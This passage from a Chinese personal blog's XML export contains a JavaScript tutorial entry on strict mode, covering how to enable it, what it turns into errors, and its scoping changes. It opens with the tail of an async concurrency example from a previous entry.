class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(running &lt; limit &amp;&amp; items.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> item = items.shift();</span><br><span class="line">    <span class="keyword">async</span>(item, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">      results.push(result);</span><br><span class="line">      running--;</span><br><span class="line">      <span class="keyword">if</span>(items.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        launcher();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(running == <span class="number">0</span>) &#123;</span><br><span class="line">        final(results);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    running++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">launcher();</span><br></pre></td></tr></table></figure>
<p>上面代码中，最多只能同时运行两个异步任务。变量<code>running</code>记录当前正在运行的任务数，只要低于门槛值，就再启动一个新的任务，如果等于<code>0</code>，就表示所有任务都执行完了，这时就执行<code>final</code>函数。</p>
<p>这段代码需要三秒完成整个脚本，处在串行执行和并行执行之间。通过调节<code>limit</code>变量，达到效率和资源的最佳平衡。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS异步操作-概述</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0030</title>
    <url>/2021/05/20/%E6%89%93%E5%8D%A10030/</url>
    <content><![CDATA[<p><font color=gray>真正的好朋友，不一定是和你聊天最多的人，却一定会在你需要的时候挺身而出，在你难熬的时候给你鼓励和力量。</font></p>
<h2 id="JS面向对象编程"><a href="#JS面向对象编程" class="headerlink" title="JS面向对象编程"></a>JS面向对象编程</h2><h3 id="5-严格模式"><a href="#5-严格模式" class="headerlink" title="5. 严格模式"></a>5. 严格模式</h3><p>除了正常的运行模式，JavaScript 还有第二种运行模式：严格模式（strict mode）。顾名思义，这种模式采用更加严格的 JavaScript 语法。</p>
<p>同样的代码，在正常模式和严格模式中，可能会有不一样的运行结果。一些在正常模式下可以运行的语句，在严格模式下将不能运行。</p>
<h4 id="5-1-设计目的"><a href="#5-1-设计目的" class="headerlink" title="5.1 设计目的"></a>5.1 设计目的</h4><p>早期的 JavaScript 语言有很多设计不合理的地方，但是为了兼容以前的代码，又不能改变老的语法，只能不断添加新的语法，引导程序员使用新语法。</p>
<p>严格模式是从 ES5 进入标准的，主要目的有以下几个。</p>
<ul>
<li>明确禁止一些不合理、不严谨的语法，减少 JavaScript 语言的一些怪异行为。</li>
<li>增加更多报错的场合，消除代码运行的一些不安全之处，保证代码运行的安全。</li>
<li>提高编译器效率，增加运行速度。</li>
<li>为未来新版本的 JavaScript 语法做好铺垫。</li>
</ul>
<p>总之，严格模式体现了 JavaScript 更合理、更安全、更严谨的发展方向。</p>
<span id="more"></span>
<h4 id="5-2-启用方法"><a href="#5-2-启用方法" class="headerlink" title="5.2 启用方法"></a>5.2 启用方法</h4><p>进入严格模式的标志，是一行字符串<code>use strict</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>老版本的引擎会把它当作一行普通字符串，加以忽略。新版本的引擎就会进入严格模式。</p>
<p>严格模式可以用于整个脚本，也可以只用于单个函数。</p>
<h5 id="1-整个脚本文件"><a href="#1-整个脚本文件" class="headerlink" title="(1)整个脚本文件"></a>(1)整个脚本文件</h5><p><code>use strict</code>放在脚本文件的第一行，整个脚本都将以严格模式运行。如果这行语句不在第一行就无效，整个脚本会以正常模式运行。(严格地说，只要前面不是产生实际运行结果的语句，<code>use strict</code>可以不在第一行，比如直接跟在一个空的分号后面，或者跟在注释后面。)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;这是严格模式&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;这是正常模式&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，一个网页文件依次有两段 JavaScript 代码。前一个<code>&lt;script&gt;</code>标签是严格模式，后一个不是。</p>
<p>如果<code>use strict</code>写成下面这样，则不起作用，严格模式必须从代码一开始就生效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;这是正常模式&#x27;</span>);</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="2-单个函数"><a href="#2-单个函数" class="headerlink" title="(2)单个函数"></a>(2)单个函数</h5><p><code>use strict</code>放在函数体的第一行，则整个函数以严格模式运行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;这是严格模式&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;这也是严格模式&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">notStrict</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;这是正常模式&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有时，需要把不同的脚本合并在一个文件里面。如果一个脚本是严格模式，另一个脚本不是，它们的合并就可能出错。严格模式的脚本在前，则合并后的脚本都是严格模式；如果正常模式的脚本在前，则合并后的脚本都是正常模式。这两种情况下，合并后的结果都是不正确的。这时可以考虑把整个脚本文件放在一个立即执行的匿名函数之中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="comment">// some code here</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h4 id="5-3-显式报错"><a href="#5-3-显式报错" class="headerlink" title="5.3 显式报错"></a>5.3 显式报错</h4><p>严格模式使得 JavaScript 的语法变得更严格，更多的操作会显式报错。其中有些操作，在正常模式下只会默默地失败，不会报错。</p>
<h5 id="5-3-1-只读属性不可写"><a href="#5-3-1-只读属性不可写" class="headerlink" title="5.3.1 只读属性不可写"></a>5.3.1 只读属性不可写</h5><p>严格模式下，设置字符串的<code>length</code>属性，会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.length = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// TypeError: Cannot assign to read only property &#x27;length&#x27; of string &#x27;abc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码报错，因为<code>length</code>是只读属性，严格模式下不可写。正常模式下，改变<code>length</code>属性是无效的，但不会报错。</p>
<p>严格模式下，对只读属性赋值，或者删除不可配置（non-configurable）属性都会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对只读属性赋值会报错</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;a&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">37</span>,</span><br><span class="line">  writable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line">obj.a = <span class="number">123</span>;</span><br><span class="line"><span class="comment">// TypeError: Cannot assign to read only property &#x27;a&#x27; of object #&lt;Object&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除不可配置的属性会报错</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">1</span>,</span><br><span class="line">  configurable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">delete</span> obj.p</span><br><span class="line"><span class="comment">// TypeError: Cannot delete property &#x27;p&#x27; of #&lt;Object&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="5-3-2-只设置了取值器的属性不可写"><a href="#5-3-2-只设置了取值器的属性不可写" class="headerlink" title="5.3.2 只设置了取值器的属性不可写"></a>5.3.2 只设置了取值器的属性不可写</h5><p>严格模式下，对一个只有取值器（getter）、没有存值器（setter）的属性赋值，会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">v</span>() &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.v = <span class="number">2</span>;</span><br><span class="line"><span class="comment">// Uncaught TypeError: Cannot set property v of #&lt;Object&gt; which has only a getter</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.v</code>只有取值器，没有存值器，对它进行赋值就会报错</p>
<h5 id="5-3-3-禁止扩展的对象不可扩展"><a href="#5-3-3-禁止扩展的对象不可扩展" class="headerlink" title="5.3.3 禁止扩展的对象不可扩展"></a>5.3.3 禁止扩展的对象不可扩展</h5><p>严格模式下，对禁止扩展的对象添加新属性，会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.preventExtensions(obj);</span><br><span class="line">obj.v = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// Uncaught TypeError: Cannot add property v, object is not extensible</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj</code>对象禁止扩展，添加属性就会报错。</p>
<h5 id="5-3-4-eval、arguments-不可用作标识名"><a href="#5-3-4-eval、arguments-不可用作标识名" class="headerlink" title="5.3.4 eval、arguments 不可用作标识名"></a>5.3.4 eval、arguments 不可用作标识名</h5><p>严格模式下，使用<code>eval</code>或者<code>arguments</code>作为标识名，将会报错。下面的语句都会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">eval</span> = <span class="number">17</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">arguments</span> = <span class="number">17</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="keyword">set</span> <span class="title">p</span>(<span class="params"><span class="built_in">arguments</span></span>) &#123; &#125; &#125;;</span><br><span class="line"><span class="keyword">try</span> &#123; &#125; <span class="keyword">catch</span> (<span class="built_in">arguments</span>) &#123; &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="built_in">eval</span></span>) </span>&#123; &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arguments</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"><span class="keyword">var</span> y = <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123; &#125;;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;arguments&#x27;</span>, <span class="string">&quot;&#x27;use strict&#x27;; return 17;&quot;</span>);</span><br><span class="line"><span class="comment">// SyntaxError: Unexpected eval or arguments in strict mode</span></span><br></pre></td></tr></table></figure>

<h5 id="5-3-5-函数不能有重名的参数"><a href="#5-3-5-函数不能有重名的参数" class="headerlink" title="5.3.5 函数不能有重名的参数"></a>5.3.5 函数不能有重名的参数</h5><p>正常模式下，如果函数有多个重名的参数，可以用<code>arguments[i]</code>读取。严格模式下，这属于语法错误</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, a, b</span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Uncaught SyntaxError: Duplicate parameter name not allowed in this context</span></span><br></pre></td></tr></table></figure>

<h5 id="5-3-6-禁止八进制的前缀0表示法"><a href="#5-3-6-禁止八进制的前缀0表示法" class="headerlink" title="5.3.6 禁止八进制的前缀0表示法"></a>5.3.6 禁止八进制的前缀0表示法</h5><p>正常模式下，整数的第一位如果是<code>0</code>，表示这是八进制数，比如<code>0100</code>等于十进制的<code>64</code>。严格模式禁止这种表示法，整数第一位为<code>0</code>，将报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> n = <span class="number">0100</span>;</span><br><span class="line"><span class="comment">// Uncaught SyntaxError: Octal literals are not allowed in strict mode.</span></span><br></pre></td></tr></table></figure>

<h4 id="5-4-增强的安全措施"><a href="#5-4-增强的安全措施" class="headerlink" title="5.4 增强的安全措施"></a>5.4 增强的安全措施</h4><p>严格模式增强了安全保护，从语法上防止了一些不小心会出现的错误。</p>
<h5 id="5-4-1-全局变量显式声明"><a href="#5-4-1-全局变量显式声明" class="headerlink" title="5.4.1 全局变量显式声明"></a>5.4.1 全局变量显式声明</h5><p>正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">v = <span class="number">1</span>; <span class="comment">// 报错，v未声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123; <span class="comment">// 报错，i 未声明</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  x = <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line">f() <span class="comment">// 报错，未声明就创建一个全局变量</span></span><br></pre></td></tr></table></figure>
<p>因此，严格模式下，变量都必须先声明，然后再使用。</p>
<h5 id="5-4-2-禁止-this-关键字指向全局对象"><a href="#5-4-2-禁止-this-关键字指向全局对象" class="headerlink" title="5.4.2 禁止 this 关键字指向全局对象"></a>5.4.2 禁止 this 关键字指向全局对象</h5><p>正常模式下，函数内部的<code>this</code>可能会指向全局对象，严格模式禁止这种用法，避免无意间创造全局变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正常模式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span> === <span class="built_in">window</span>);</span><br><span class="line">&#125;</span><br><span class="line">f() <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 严格模式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span> === <span class="literal">undefined</span>);</span><br><span class="line">&#125;</span><br><span class="line">f() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，严格模式的函数体内部<code>this</code>是<code>undefined</code>。</p>
<p>这种限制对于构造函数尤其有用。使用构造函数时，有时忘了加<code>new</code>，这时<code>this</code>不再指向全局对象，而是报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="built_in">this</span>.a = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">f();<span class="comment">// 报错，this 未定义</span></span><br></pre></td></tr></table></figure>
<p>严格模式下，函数直接调用时（不使用<code>new</code>调用），函数内部的<code>this</code>表示<code>undefined</code>（未定义），因此可以用<code>call</code>、<code>apply</code>和<code>bind</code>方法，将任意值绑定在<code>this</code>上面。正常模式下，<code>this</code>指向全局对象，如果绑定的值是非对象，将被自动转为对象再绑定上去，而<code>null</code>和<code>undefined</code>这两个无法转成对象的值，将被忽略。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正常模式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun() <span class="comment">// window</span></span><br><span class="line">fun.call(<span class="number">2</span>) <span class="comment">// Number &#123;2&#125;</span></span><br><span class="line">fun.call(<span class="literal">true</span>) <span class="comment">// Boolean &#123;true&#125;</span></span><br><span class="line">fun.call(<span class="literal">null</span>) <span class="comment">// window</span></span><br><span class="line">fun.call(<span class="literal">undefined</span>) <span class="comment">// window</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 严格模式</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun() <span class="comment">//undefined</span></span><br><span class="line">fun.call(<span class="number">2</span>) <span class="comment">// 2</span></span><br><span class="line">fun.call(<span class="literal">true</span>) <span class="comment">// true</span></span><br><span class="line">fun.call(<span class="literal">null</span>) <span class="comment">// null</span></span><br><span class="line">fun.call(<span class="literal">undefined</span>) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，可以把任意类型的值，绑定在<code>this</code>上面。</p>
<h5 id="5-4-3-禁止使用-fn-callee、fn-caller"><a href="#5-4-3-禁止使用-fn-callee、fn-caller" class="headerlink" title="5.4.3 禁止使用 fn.callee、fn.caller"></a>5.4.3 禁止使用 fn.callee、fn.caller</h5><p>函数内部不得使用<code>fn.caller</code>、<code>fn.arguments</code>，否则会报错。这意味着不能在函数内部得到调用栈了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  f1.caller;    <span class="comment">// 报错</span></span><br><span class="line">  f1.arguments; <span class="comment">// 报错</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f1();</span><br></pre></td></tr></table></figure>

<h5 id="5-4-4-禁止使用-arguments-callee、arguments-caller"><a href="#5-4-4-禁止使用-arguments-callee、arguments-caller" class="headerlink" title="5.4.4 禁止使用 arguments.callee、arguments.caller"></a>5.4.4 禁止使用 arguments.callee、arguments.caller</h5><p><code>arguments.callee</code>和<code>arguments.caller</code>是两个历史遗留的变量，从来没有标准化过，现在已经取消了。正常模式下调用它们没有什么作用，但是不会报错。严格模式明确规定，函数内部使用<code>arguments.callee</code>、<code>arguments.caller</code>将会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">arguments</span>.callee;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">f(); <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>

<h5 id="5-4-5-禁止删除变量"><a href="#5-4-5-禁止删除变量" class="headerlink" title="5.4.5 禁止删除变量"></a>5.4.5 禁止删除变量</h5><p>严格模式下无法删除变量，如果使用<code>delete</code>命令删除一个变量，会报错。只有对象的属性，且属性的描述对象的<code>configurable</code>属性设置为<code>true</code>，才能被<code>delete</code>命令删除。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">delete</span> x; <span class="comment">// 语法错误</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(<span class="literal">null</span>, &#123;</span><br><span class="line">  x: &#123;</span><br><span class="line">    value: <span class="number">1</span>,</span><br><span class="line">    configurable: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">delete</span> obj.x; <span class="comment">// 删除成功</span></span><br></pre></td></tr></table></figure>

<h4 id="5-5-静态绑定"><a href="#5-5-静态绑定" class="headerlink" title="5.5 静态绑定"></a>5.5 静态绑定</h4><p>JavaScript 语言的一个特点，就是允许“动态绑定”，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。</p>
<p>严格模式对动态绑定做了一些限制。某些情况下，只允许静态绑定。也就是说，属性和方法到底归属哪个对象，必须在编译阶段就确定。这样做有利于编译效率的提高，也使得代码更容易阅读，更少出现意外。</p>
<p>具体来说，涉及以下几个方面:</p>
<h5 id="5-5-1-禁止使用-with-语句"><a href="#5-5-1-禁止使用-with-语句" class="headerlink" title="5.5.1 禁止使用 with 语句"></a>5.5.1 禁止使用 with 语句</h5><p>严格模式下，使用<code>with</code>语句将报错。因为<code>with</code>语句无法在编译时就确定，某个属性到底归属哪个对象，从而影响了编译效果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> v  = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> (obj) &#123;</span><br><span class="line">  v = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Uncaught SyntaxError: Strict mode code may not include a with statement</span></span><br></pre></td></tr></table></figure>

<h5 id="5-5-2-创设-eval-作用域"><a href="#5-5-2-创设-eval-作用域" class="headerlink" title="5.5.2 创设 eval 作用域"></a>5.5.2 创设 eval 作用域</h5><p>正常模式下，JavaScript 语言有两种变量作用域（scope）：全局作用域和函数作用域。严格模式创设了第三种作用域：<code>eval</code>作用域。</p>
<p>正常模式下，<code>eval</code>语句的作用域，取决于它处于全局作用域，还是函数作用域。严格模式下，<code>eval</code>语句本身就是一个作用域，不再能够在其所运行的作用域创设新的变量了，也就是说，<code>eval</code>所生成的变量只能用于<code>eval</code>内部。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">eval</span>(<span class="string">&#x27;var x = 5; x&#x27;</span>)) <span class="comment">// 5</span></span><br><span class="line">  <span class="built_in">console</span>.log(x) <span class="comment">// 2</span></span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>上面代码中，由于<code>eval</code>语句内部是一个独立作用域，所以内部的变量<code>x</code>不会泄露到外部。</p>
<p>注意，如果希望<code>eval</code>语句也使用严格模式，有两种方式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br><span class="line">f1(<span class="string">&#x27;undeclared_variable = 1&#x27;</span>); <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式二</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br><span class="line">f2(<span class="string">&#x27;&quot;use strict&quot;;undeclared_variable = 1&#x27;</span>)  <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<p>上面两种写法，<code>eval</code>内部使用的都是严格模式。</p>
<h5 id="5-5-3-arguments-不再追踪参数的变化"><a href="#5-5-3-arguments-不再追踪参数的变化" class="headerlink" title="5.5.3 arguments 不再追踪参数的变化"></a>5.5.3 arguments 不再追踪参数的变化</h5><p>变量<code>arguments</code>代表函数的参数。严格模式下，函数内部改变参数与<code>arguments</code>的联系被切断了，两者不再存在联动关系。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  a = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> [a, <span class="built_in">arguments</span>[<span class="number">0</span>]];</span><br><span class="line">&#125;</span><br><span class="line">f(<span class="number">1</span>); <span class="comment">// 正常模式为[2, 2]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  a = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> [a, <span class="built_in">arguments</span>[<span class="number">0</span>]];</span><br><span class="line">&#125;</span><br><span class="line">f(<span class="number">1</span>); <span class="comment">// 严格模式为[2, 1]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，改变函数的参数，不会反应到<code>arguments</code>对象上来。</p>
<h4 id="5-6-向下一个版本的-JavaScript-过渡"><a href="#5-6-向下一个版本的-JavaScript-过渡" class="headerlink" title="5.6 向下一个版本的 JavaScript 过渡"></a>5.6 向下一个版本的 JavaScript 过渡</h4><p>JavaScript 语言的下一个版本是 ECMAScript 6，为了平稳过渡，严格模式引入了一些 ES6 语法。</p>
<h5 id="5-6-1-非函数代码块不得声明函数"><a href="#5-6-1-非函数代码块不得声明函数" class="headerlink" title="5.6.1 非函数代码块不得声明函数"></a>5.6.1 非函数代码块不得声明函数</h5><p>ES6 会引入块级作用域。为了与新版本接轨，ES5 的严格模式只允许在全局作用域或函数作用域声明函数。也就是说，不允许在非函数的代码块内声明函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123; &#125; <span class="comment">// 语法错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123; &#125; <span class="comment">// 语法错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码在<code>if</code>代码块和<code>for</code>代码块中声明了函数，ES5 环境会报错。</p>
<p>注意，如果是 ES6 环境，上面的代码不会报错，因为 ES6 允许在代码块之中声明函数。</p>
<h5 id="5-6-2-保留字"><a href="#5-6-2-保留字" class="headerlink" title="5.6.2 保留字"></a>5.6.2 保留字</h5><p>为了向将来 JavaScript 的新版本过渡，严格模式新增了一些保留字（implements、interface、let、package、private、protected、public、static、yield等）。使用这些词作为变量名将会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">package</span>(<span class="params">protected</span>) </span>&#123; <span class="comment">// 语法错误</span></span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> implements; <span class="comment">// 语法错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS面向对象编程-严格模式</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0032</title>
    <url>/2021/05/21/%E6%89%93%E5%8D%A10032/</url>
